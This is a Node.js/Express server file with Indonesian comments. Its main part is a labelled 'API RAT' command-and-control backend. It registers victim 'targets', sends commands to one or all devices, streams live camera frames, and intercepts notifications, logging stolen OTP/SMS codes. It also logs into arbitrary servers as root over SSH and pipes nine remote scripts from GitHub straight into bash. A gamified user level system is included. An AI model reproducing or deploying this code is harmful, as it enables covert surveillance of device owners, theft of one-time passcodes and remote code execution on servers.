const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const { Client } = require('ssh2');
const { v4: uuidv4 } = require('uuid');

// ========== INI PENTING - DEFISIKAN APP DULU ==========
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8
});

// Routes
const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/user');
const whatsappRoutes = require('./routes/whatsapp');
const vpsRoutes = require('./routes/vps');
const toolsRoutes = require('./routes/tools');
const chatRoutes = require('./routes/chat');

// Middleware
const authMiddleware = require('./middleware/authMiddleware');
const rateLimitMiddleware = require('./middleware/rateLimitMiddleware');

// ========== MIDDLEWARE ==========
app.use(helmet());
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json({ limit: '500mb' }));
app.use(rateLimitMiddleware);

// ========== DATABASE SETUP ==========
const DB_DIR = './data';
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);

const FILES = {
    TARGETS: path.join(DB_DIR, 'targets.json'),
    NOTIFS: path.join(DB_DIR, 'notifications.json'),
    COMMANDS: path.join(DB_DIR, 'commands.json'),
    RESPONSES: path.join(DB_DIR, 'responses.json'),
    USERS: path.join(DB_DIR, 'users.json'),
    LEVELS: path.join(DB_DIR, 'levels.json'),
    SESSIONS: path.join(DB_DIR, 'sessions.json')
};

const readDB = (file) => {
    if (!fs.existsSync(file)) return [];
    try { return JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch (e) { return []; }
};

const saveDB = (file, data) => {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch (e) { console.log(`[!] DB Write Error: ${e.message}`); }
};

// ========== SESSIONS UNTUK INSTALLASI ==========
const installSessions = new Map();

const scripts = [
    'mbut.sh', 'mbut2.sh', 'mbut3.sh', 'mbut4.sh', 'mbut5.sh',
    'mbut6.sh', 'mbut7.sh', 'mbut8.sh', 'mbut9.sh'
];

// ========== FUNGSI INSTALLASI ==========
function execCommand(conn, cmd) {
    return new Promise((resolve, reject) => {
        conn.exec(cmd, (err, stream) => {
            if (err) return reject(err);
            let output = '';
            stream.on('data', (data) => { output += data; });
            stream.stderr.on('data', (data) => { output += data; });
            stream.on('close', () => resolve(output));
        });
    });
}

function addLog(sessionId, message) {
    const session = installSessions.get(sessionId);
    if (session) {
        session.logs.push({
            time: new Date().toLocaleTimeString(),
            message: message
        });
        console.log(`[${sessionId.substring(0,8)}] ${message}`);
    }
}

async function runInstallation(sessionId, ip, password) {
    const conn = new Client();
    const session = installSessions.get(sessionId);
    
    if (!session) return;
    
    addLog(sessionId, '🔌 Menghubungkan ke VPS...');
    
    conn.on('ready', async () => {
        addLog(sessionId, '✅ Terhubung ke VPS');
        
        for (let i = 0; i < scripts.length; i++) {
            const script = scripts[i];
            const step = i + 1;
            
            const currentSession = installSessions.get(sessionId);
            if (!currentSession) return;
            
            currentSession.progress = (step / scripts.length) * 100;
            currentSession.currentScript = script;
            installSessions.set(sessionId, currentSession);
            
            addLog(sessionId, `📦 [${step}/${scripts.length}] Install ${script}`);
            
            const scriptURL = `https://raw.githubusercontent.com/XBellavxii/mbut/main/${script}`;
            
            try {
                await execCommand(conn, `curl -fsSL ${scriptURL} | bash`);
                addLog(sessionId, `✅ ${script} selesai`);
            } catch (error) {
                addLog(sessionId, `❌ Gagal: ${script} - ${error.message}`);
                currentSession.status = 'error';
                installSessions.set(sessionId, currentSession);
                conn.end();
                return;
            }
        }
        
        const finalSession = installSessions.get(sessionId);
        if (finalSession) {
            addLog(sessionId, '🎉 SEMUA INSTALASI SELESAI!');
            addLog(sessionId, `🌐 Panel: http://${ip}:8080`);
            finalSession.status = 'completed';
            finalSession.progress = 100;
            installSessions.set(sessionId, finalSession);
        }
        conn.end();
    });
    
    conn.on('error', (err) => {
        addLog(sessionId, `❌ Error: ${err.message}`);
        const errorSession = installSessions.get(sessionId);
        if (errorSession) {
            errorSession.status = 'error';
            installSessions.set(sessionId, errorSession);
        }
    });
    
    conn.connect({
        host: ip,
        port: 22,
        username: 'root',
        password: password,
        readyTimeout: 30000
    });
}

// ========== API INSTALL PROTEK ==========
// Endpoint: Mulai instalasi
app.post('/src/api/install', async (req, res) => {
    const { ip, password } = req.body;
    
    if (!ip || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'IP dan password diperlukan' 
        });
    }
    
    const sessionId = uuidv4();
    
    installSessions.set(sessionId, {
        id: sessionId,
        ip: ip,
        status: 'running',
        progress: 0,
        currentScript: '',
        logs: [],
        startTime: Date.now()
    });
    
    // Jalankan instalasi di background
    runInstallation(sessionId, ip, password);
    
    res.json({ 
        success: true, 
        sessionId: sessionId,
        message: 'Instalasi dimulai'
    });
});

// Endpoint: Cek status
app.get('/src/api/status/:sessionId', (req, res) => {
    const session = installSessions.get(req.params.sessionId);
    
    if (!session) {
        return res.status(404).json({ 
            success: false, 
            message: 'Session tidak ditemukan' 
        });
    }
    
    res.json({
        success: true,
        status: session.status,
        progress: session.progress,
        currentScript: session.currentScript,
        logs: session.logs.slice(-20)
    });
});

// Endpoint: Hentikan instalasi
app.delete('/src/api/stop/:sessionId', (req, res) => {
    const session = installSessions.get(req.params.sessionId);
    
    if (!session) {
        return res.status(404).json({ 
            success: false, 
            message: 'Session tidak ditemukan' 
        });
    }
    
    session.status = 'stopped';
    installSessions.delete(req.params.sessionId);
    
    res.json({ 
        success: true, 
        message: 'Instalasi dihentikan' 
    });
});

// Endpoint: List semua session
app.get('/src/api/sessions', (req, res) => {
    const sessions = Array.from(installSessions.values()).map(s => ({
        id: s.id,
        ip: s.ip,
        status: s.status,
        progress: s.progress,
        currentScript: s.currentScript
    }));
    
    res.json({
        success: true,
        total: sessions.length,
        data: sessions
    });
});

// ==========================================================
// [+] LEVEL SYSTEM (MAX 50.000)
// ==========================================================

const MAX_LEVEL = 50000;

function getRequiredXP(level) {
    return level * 10;
}

function getRankTitle(level) {
    if (level >= 50000) return "ALMIGHTY GOD EMPEROR";
    if (level >= 25000) return "DEATH INCARNATE";
    if (level >= 10000) return "HELL OVERLORD";
    if (level >= 5000) return "SUPREME WARLORD";
    if (level >= 2500) return "LEGENDARY MASTER";
    if (level >= 1000) return "GRAND CHAMPION";
    if (level >= 500) return "ELITE COMMANDER";
    if (level >= 250) return "VETERAN WARRIOR";
    if (level >= 100) return "SKILLED FIGHTER";
    if (level >= 50) return "SEASONED MEMBER";
    if (level >= 25) return "ACTIVE USER";
    if (level >= 10) return "REGULAR MEMBER";
    return "NEWBIE";
}

// ==========================================================
// [+] SOCKET.IO
// ==========================================================

io.on('connection', (socket) => {
    const { id, type } = socket.handshake.query;
    
    if (id) {
        socket.join(id);
        if (type === 'admin') {
            socket.join('ADMIN_ROOM');
            console.log(`[+] Admin Linked: ${id}`);
        } else {
            console.log(`[+] Target Linked: ${id}`);
            io.to('ADMIN_ROOM').emit('target_status', { id, status: 'online' });
        }
    }

    socket.on('disconnect', () => {
        console.log(`[-] Connection Lost: ${id}`);
        if (id && type !== 'admin') {
            let targets = readDB(FILES.TARGETS);
            const index = targets.findIndex(t => t.id === id);
            if (index !== -1) {
                targets[index].status = "Offline";
                saveDB(FILES.TARGETS, targets);
                io.to('ADMIN_ROOM').emit('target_status', { id, status: 'offline' });
            }
        }
    });
});

// ==========================================================
// [+] ROUTES
// ==========================================================

app.use('/api/auth', authRoutes);
app.use('/api/user', authMiddleware, userRoutes);
app.use('/api/whatsapp', authMiddleware, whatsappRoutes);
app.use('/api/vps', authMiddleware, vpsRoutes);
app.use('/api/tools', authMiddleware, toolsRoutes);
app.use('/', chatRoutes);

// ==========================================================
// [+] API RAT
// ==========================================================

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body; 
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === deviceData.id);
    const entry = { ...deviceData, lastSeen: new Date(), status: 'Online' };
    
    if (index !== -1) {
        targets[index] = { ...targets[index], ...entry };
    } else {
        targets.push(entry);
    }
    
    saveDB(FILES.TARGETS, targets);
    io.to('ADMIN_ROOM').emit('device_info', entry);
    res.json({ status: 'ok' });
});

app.post('/api/send-command', (req, res) => {
    const { deviceId, id, command, extra } = req.body;
    const targetId = deviceId || id;

    io.to(targetId).emit('new_command', { command, extra });

    let commands = readDB(FILES.COMMANDS);
    commands.push({ targetId, command, extra, timestamp: new Date() });
    saveDB(FILES.COMMANDS, commands.slice(-500));
    
    console.log(`[CMD] ${command} sent to ${targetId}`);
    res.json({ status: 'sent', targetId });
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const responsePayload = req.body;

    if (responsePayload.cmd === "live_camera_frame") {
        io.to('ADMIN_ROOM').emit('live_frame', {
            id: targetId,
            image: responsePayload.data
        });
        return res.json({ status: 'streaming' });
    }
    
    io.to('ADMIN_ROOM').emit('new_response', {
        deviceId: targetId,
        cmd: responsePayload.cmd,
        data: responsePayload.data
    });

    let responses = readDB(FILES.RESPONSES);
    responses = responses.filter(r => !(r.targetId === targetId && r.cmd === responsePayload.cmd));
    responses.push({ targetId, ...responsePayload, timestamp: new Date() });
    saveDB(FILES.RESPONSES, responses.slice(-1000));

    res.json({ status: 'broadcasted' });
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    const data = req.body;

    if(data.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${data.title} -> ${data.body || data.text}`);
    }

    const entry = {
        targetId,
        app: data.app || "SYSTEM",
        title: data.title || data.sender || "Unknown",
        body: data.body || data.text || data.message || "No content",
        package: data.package || "com.android.system",
        category: data.category || "NOTIFICATION",
        timestamp: data.timestamp || new Date().toISOString()
    };

    io.to('ADMIN_ROOM').emit('new_notification', entry);

    let allNotifs = readDB(FILES.NOTIFS);
    allNotifs.unshift(entry);
    saveDB(FILES.NOTIFS, allNotifs.slice(0, 1000)); 
    
    console.log(`[INTEL] ${entry.app} intercept from ${targetId}: ${entry.title}`);
    res.json({ status: 'saved' });
});

app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    const { battery } = req.body;
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === targetId);
    
    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].battery = battery;
        targets[index].status = "Online";
        saveDB(FILES.TARGETS, targets);
    }
    io.to('ADMIN_ROOM').emit('heartbeat', { deviceId: targetId, battery });
    res.json({ status: 'alive' });
});

app.get('/api/get-response/:id', (req, res) => {
    const responses = readDB(FILES.RESPONSES);
    const notifs = readDB(FILES.NOTIFS);
    
    const targetResponses = responses.filter(r => r.targetId === req.params.id);
    const targetNotifs = notifs.filter(n => n.targetId === req.params.id);
    
    const formattedData = {};
    targetResponses.forEach(r => {
        formattedData[r.cmd.replace('get_', '')] = r.data;
    });

    formattedData['notifications'] = targetNotifs;

    res.json({ data: formattedData });
});

app.get('/api/list-targets', (req, res) => {
    res.json(readDB(FILES.TARGETS));
});

app.get('/api/target/:id', (req, res) => {
    const targets = readDB(FILES.TARGETS);
    const target = targets.find(t => t.id === req.params.id);
    if (!target) return res.status(404).json({ error: 'Target not found' });
    res.json(target);
});

app.delete('/api/target/:id', (req, res) => {
    let targets = readDB(FILES.TARGETS);
    const filtered = targets.filter(t => t.id !== req.params.id);
    saveDB(FILES.TARGETS, filtered);
    res.json({ status: 'deleted', id: req.params.id });
});

app.post('/api/broadcast-command', (req, res) => {
    const { command, extra } = req.body;
    const targets = readDB(FILES.TARGETS);
    targets.forEach(target => {
        io.to(target.id).emit('new_command', { command, extra });
    });
    res.json({ status: 'broadcasted', totalTargets: targets.length });
});

app.get('/api/commands/:targetId', (req, res) => {
    const commands = readDB(FILES.COMMANDS);
    const targetCommands = commands.filter(c => c.targetId === req.params.targetId);
    res.json(targetCommands.slice(-50));
});

app.delete('/api/clear-target-data/:id', (req, res) => {
    let responses = readDB(FILES.RESPONSES);
    responses = responses.filter(r => r.targetId !== req.params.id);
    saveDB(FILES.RESPONSES, responses);
    
    let notifs = readDB(FILES.NOTIFS);
    notifs = notifs.filter(n => n.targetId !== req.params.id);
    saveDB(FILES.NOTIFS, notifs);
    
    res.json({ status: 'cleared', id: req.params.id });
});

app.get('/api/stats', (req, res) => {
    const targets = readDB(FILES.TARGETS);
    const online = targets.filter(t => t.status === 'Online').length;
    res.json({
        totalTargets: targets.length,
        online: online,
        offline: targets.length - online
    });
});

// ==========================================================
// [+] LEVEL API
// ==========================================================

app.get('/api/level/:username', (req, res) => {
    const username = req.params.username;
    
    let levels = readDB(FILES.LEVELS);
    let user = levels.find(l => l.username === username);
    
    if (!user) {
        user = {
            username: username,
            level: 1,
            xp: 0,
            totalXp: 0,
            joinDate: new Date().toISOString(),
            lastActive: new Date().toISOString()
        };
        levels.push(user);
        saveDB(FILES.LEVELS, levels);
    }
    
    const lastUpdate = new Date(user.lastActive);
    const now = new Date();
    const daysDiff = Math.floor((now - lastUpdate) / (1000 * 60 * 60 * 24));
    
    if (daysDiff > 0 && user.level < MAX_LEVEL) {
        let newLevel = user.level + (daysDiff * 10);
        if (newLevel > MAX_LEVEL) newLevel = MAX_LEVEL;
        
        const xpGained = daysDiff * 100;
        user.xp += xpGained;
        user.totalXp += xpGained;
        user.level = newLevel;
        user.lastActive = now.toISOString();
        
        while (user.xp >= getRequiredXP(user.level) && user.level < MAX_LEVEL) {
            user.level++;
            user.xp -= getRequiredXP(user.level - 1);
        }
        if (user.level >= MAX_LEVEL) user.xp = 0;
        
        saveDB(FILES.LEVELS, levels);
    }
    
    const requiredXP = getRequiredXP(user.level);
    const percentage = ((user.xp / requiredXP) * 100).toFixed(1);
    
    res.json({
        status: true,
        data: {
            username: user.username,
            level: user.level,
            maxLevel: MAX_LEVEL,
            xp: user.xp,
            requiredXp: requiredXP,
            totalXp: user.totalXp,
            percentage: percentage,
            rank: getRankTitle(user.level),
            joinDate: user.joinDate
        }
    });
});

app.post('/api/level/add-xp', (req, res) => {
    const { username, xpAmount } = req.body;
    
    let levels = readDB(FILES.LEVELS);
    let user = levels.find(l => l.username === username);
    
    if (!user) {
        user = {
            username: username,
            level: 1,
            xp: 0,
            totalXp: 0,
            joinDate: new Date().toISOString(),
            lastActive: new Date().toISOString()
        };
        levels.push(user);
    }
    
    let leveledUp = false;
    user.xp += xpAmount;
    user.totalXp += xpAmount;
    
    while (user.xp >= getRequiredXP(user.level) && user.level < MAX_LEVEL) {
        user.level++;
        user.xp -= getRequiredXP(user.level - 1);
        leveledUp = true;
    }
    
    if (user.level >= MAX_LEVEL) {
        user.xp = 0;
    }
    
    user.lastActive = new Date().toISOString();
    saveDB(FILES.LEVELS, levels);
    
    res.json({
        status: true,
        leveledUp: leveledUp,
        data: {
            level: user.level,
            xp: user.xp,
            totalXp: user.totalXp,
            requiredXp: getRequiredXP(user.level)
        }
    });
});

app.get('/api/level/leaderboard', (req, res) => {
    let levels = readDB(FILES.LEVELS);
    const sorted = [...levels].sort((a, b) => {
        if (a.level !== b.level) return b.level - a.level;
        return b.totalXp - a.totalXp;
    }).slice(0, 10);
    
    const leaderboard = sorted.map((user, i) => ({
        rank: i + 1,
        username: user.username,
        level: user.level,
        totalXp: user.totalXp,
        rankTitle: getRankTitle(user.level)
    }));
    
    res.json({ status: true, data: leaderboard });
});

app.get('/ping', (req, res) => res.send('pong'));

// Cleanup session lama setiap 5 menit
setInterval(() => {
    const now = Date.now();
    for (const [id, session] of installSessions.entries()) {
        if (session.status === 'completed' || session.status === 'error') {
            if (now - session.startTime > 3600000) {
                installSessions.delete(id);
            }
        }
    }
}, 300000);

module.exports = server;